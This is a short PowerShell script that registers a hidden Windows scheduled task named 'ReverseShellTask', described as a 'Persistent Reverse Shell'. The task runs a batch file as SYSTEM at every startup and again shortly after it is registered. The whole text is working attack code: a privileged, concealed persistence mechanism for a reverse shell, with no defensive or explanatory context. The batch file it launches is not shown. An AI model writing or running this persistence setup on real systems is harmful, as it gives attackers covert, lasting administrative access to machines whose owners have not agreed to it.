# Define the action to run the batch file
$Action = New-ScheduledTaskAction -Execute "cmd.exe" -Argument "/c C:\Users\Administrator\Desktop\test\run_shell.bat"

# Define the triggers: one for startup and one for immediate execution
$TriggerAtStartup = New-ScheduledTaskTrigger -AtStartup
$TriggerImmediate = New-ScheduledTaskTrigger -Once -At (Get-Date).AddSeconds(15)  # Start immediately after 15 seconds

# Define the settings for the scheduled task
$Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -Hidden -StartWhenAvailable

# Define the principal to run the task as SYSTEM
$Principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount

# Register the scheduled task with the defined action, triggers, settings, and principal
Register-ScheduledTask -Action $Action -Trigger @($TriggerAtStartup, $TriggerImmediate) -Settings $Settings -Principal $Principal -TaskName "ReverseShellTask" -Description "Persistent Reverse Shell"
